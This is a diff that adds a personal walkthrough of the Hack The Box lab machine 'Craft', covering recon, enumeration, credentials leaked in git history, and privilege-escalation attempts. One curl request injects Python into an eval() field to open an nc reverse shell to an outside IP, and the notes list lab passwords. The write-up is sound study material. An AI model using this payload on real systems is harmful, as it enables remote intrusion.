@@ -1,0 +1,91 @@
+# Recon
+## Comm Tcp
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey:
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+| tls-nextprotoneg:
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+## all tcp
+
+# Enum
+## 443 https
+cert info =>
+admin@craft.htb
+Buffalo
+
+gobuster => looks like nothing, stopped.
+
+it mentions rest api.
+find links
+<li><a href="https://api.craft.htb/api/">API</a></li>
+<li><a href="https://gogs.craft.htb/"></li>
+add to /etc/hosts
+
+### api.craft.htb
+rest api
+
+### gogs.craft.htb
+a git service
+find users:
+administrator
+Erlich Bachman, ebachman
+Dinesh Chugtai, dinesh
+Bertram Gilfoyle, gilfoyle
+
+find the source code of craft_api.
+in issue tab:
+curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
+
+another issue mentions adding auth to /api/brew, at least the operations that modify db. But the mentioned fix commit is 404.
+(the 404 could mean they deleted that commit)
+read the code, as mentioned in issue, there is a eval() in /brew put request handler.
+tried to use the token in issue, not working.
+
+go thought version in git, find dinesh commited passsword in a version
+'dinesh', '4aUh0A8PbVJxgd'
+
+curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTkzNzUzNTQ4fQ.TQdVBwxUAOaak1zZMuG5zlIgJqyLgYb-HMLNaLQBJaY' -H  "accept: application/json" -H  "Content-Type: application/json" -k -X POST "https://api.craft.htb/api/brew/" -d "{  \"id\": 0,  \"brewer\": \"string\",  \"name\": \"string\",  \"style\": \"string\",  \"abv\": \"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f')\"}" -k
+=> get foothold
+
+# Priv
+# Escape Docker
+we are root but in a docker.
+netstat shows 172.20.0.7 and 172.20.0.4 are connecting to this.
+somehow there is no port 22, thus it may be from the host.
+in settings.py:
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'                                                                              
+MYSQL_DATABASE_HOST = 'db'
+
+there is login page in gogs, use dinesh's cred, his key shows as =>
+SHA256:8Fc2kZiv0Y+kjkh8atKr6brzBiM1DoDIhG6LN1ktPfA
+not sure what to do
+
+wrote a script to get all users from table "user"
+=> [{'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+
+use gilfoyle's cred to login gogs => he has a repo "craft-infra"
+find his ssh key. need password, tried with his password => ok!
+=> foothold got
+
+# Priv Esc
+find a vault_token, google, vault seems a secret keeping stuff.
+VAULT_ADDR=https://vault.craft.htb:8200/
+
+(get hint: go back to info gethering!!!)
+shamefully copy the root.txt from other posts because there is a cert issue in this box. Shame on me :))
